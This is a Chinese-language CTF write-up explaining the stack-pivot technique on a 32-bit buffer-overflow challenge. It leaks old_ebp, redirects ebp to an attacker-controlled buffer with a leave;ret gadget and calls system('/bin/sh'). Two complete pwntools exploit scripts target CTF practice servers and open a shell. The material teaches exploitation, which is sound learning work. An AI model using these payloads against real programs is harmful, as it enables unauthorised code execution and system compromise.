省流：栈迁移中，要把我们的 rbp 地址改为我们的 payload 的地址，要把我们的 ret 地址换成我们的 leave-ret gadget


![](https://pic2.zhimg.com/80/v2-22c432841377581403b6b3f5dc1c1d61_720w.webp)

在这道题里，hack函数没用，有system函数，所以我们构造一个'/bin/sh'来执行拿到shell即可，read函数读取了0x30个字符，但s只有40，那么溢出了8个字符，不够我们构造完整的ROP链，但刚好可以覆盖掉ret和ebp，这种时候就要用到栈迁移了。

我们看下调试信息，在第一个输入后打断点，随便输入一段字符，得到的栈空间如图：

![](https://pic4.zhimg.com/80/v2-0d9d742fb6fb1c6617854339b9f21093_720w.webp)

可以看到是从 0 xffffd0d0位置进行输入的输入的位置与 0 xffffd108，也即 old_ebp 的位置差距是0xd108-0xd0d0=0x38，**这里就是我之前有一点疑惑的点了，为什么要计算这个距离呢，因为输入的起始位置和 old_ebp 的相对距离是固定的，在这道题中，只有这一个地方我们可以进行输入，那么我们后续构造出的恶意代码如何确定他位置呢，就是通过先泄露出 old_ebp 的值，再通过相对位置来进行确定。（为什么不直接把输入起始的位置记下来呢，因为开起了栈的随机化，每次的位置不一样，但相对位置是一样的）**

在这道题中，使用了两次printf，printf在遇到'\0'前会一直输出，所以可以通过他来泄露出old_ebp的值，泄露出来后就可以进行我们payload的构造了，我们首先通过ROPgadget来找一下我们想要的leave和ret地址，找到了进行一个记录

![](https://pic2.zhimg.com/80/v2-5de281965587285668fdee5ce3566f89_720w.webp)

接下来就可以写payload啦，我们想写入的payload在栈上过程是这样的

![](https://pic2.zhimg.com/80/v2-7eae51b775bac6a2881abc73fdf5f0bd_720w.webp)

输入payload前，已经获取了old_ebp的值

现在要做的就是再次进行输入，将恶意代码写入我们能定位的从 old_ebp-0x38开始的位置，（这里的 38 一般来说是我们的 **read 一次能够读入的大小**。）我们进行 payload 的构造需要覆盖到 ret_add 这里，将其覆盖为 leave，ret，而 old_ebp 的值要被覆盖到输入开始的地方，也就是通过泄露得到的 old_ebp-0x38，所以我们构造的 payload 如下：

```text
payload2 = b'bbbb'+p32(system_add)+b'cccc'+p32(old_ebp-0x38+0x10) + b'/bin/sh'
payload2 = payload2.ljust(0x28,b'p')
payload2= payload2+p32(old_ebp-0x38)+p32(leave_ret_addr)
```

这样发送了payload后，栈上情况如图：

![](https://pic4.zhimg.com/80/v2-4f9410548bef3ff542494d57e05855ab_720w.webp)

当程序正常执行退出时，就会执行第一次leave,ret，这时ebp就会指向bbbb这里，esp就会指向leave_ret_add，然后进行ret，再一次执行leave,ret，这时esp就会先指向ebp现在指向的bbbb，然后执行pop ebp后，ebp就指向了一个无所谓在哪的地址，esp指向了sys，执行ret，开始值执行我们的恶意代码了，具体流程如下

![](https://pic4.zhimg.com/80/v2-93190b7ac808781cfeb360cea6bf04bb_720w.webp)

		执行了leave中的mov esp，ebp

![](https://pic3.zhimg.com/80/v2-a2d8a939994b3cacb939a8958d430146_720w.webp)

				执行了pop ebp

模版：
```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
native = 0

if native:
    p = process('pwn1')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('node2.anna.nssctf.cn',28212)


# libc = ELF('')

def debug():
    gdb.attach(p)
    pause()


def get_addr():
    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))


se = lambda data: p.send(data)
sa = lambda delim, data: p.sendafter(delim, data)
sl = lambda data: p.sendline(data)
sla = lambda delim, data: p.sendlineafter(delim, data)
sea = lambda delim, data: p.sendafter(delim, data)
rc = lambda numb=4096: p.recv(numb)
rl = lambda: p.recvline()
ru = lambda delims: p.recvuntil(delims)

elf = ELF('pwn1')
system = elf.sym['system']
sh = 0x400911
leave_ret = 0x4007f2
pop_rdi = 0x4008d3
ret = 0x4005b9
sla("name:",b'%16$p')
ru("hello,")
rbp_addr = int(p.recv(14).decode(),16) -0x10
success("rbp-->"+hex(rbp_addr))
s_input = rbp_addr - 0x50
payload = b'/bin/sh\x00' + flat([ret,pop_rdi,s_input,system])
payload = payload.ljust(0x50,b'\x00')
payload += p64(s_input) + p64(leave_ret)
sea("keep on !\n",payload)

p.interactive()

```


```text
from pwn import *
context(log_level="debug")
sh= process('./ciscn_2019_es_2')
sh=remote("node4.buuoj.cn",28751)
payload1=b'a'*0x27+b'B'
#这里不能sendline，不然printf就会截断到B
sh.send(payload1)
sh.recvuntil('B')
old_ebp=u32(sh.recv(4))
print(hex(old_ebp))
leave_ret = 0x08048562
system_add = 0x8048400
#这里第四个参数就是计算出的binsh的地址
payload2 = b'bbbb'+p32(system_add)+b'cccc'+p32(old_ebp-0x38+0x10) + b'/bin/sh\x00'
#进行填充，
payload2 =payload2.ljust(0x28,b'p')
payload2= payload2+p32(old_ebp-0x38)+p32(leave_ret)
sh.sendline(payload2)
sh.interactive()
```

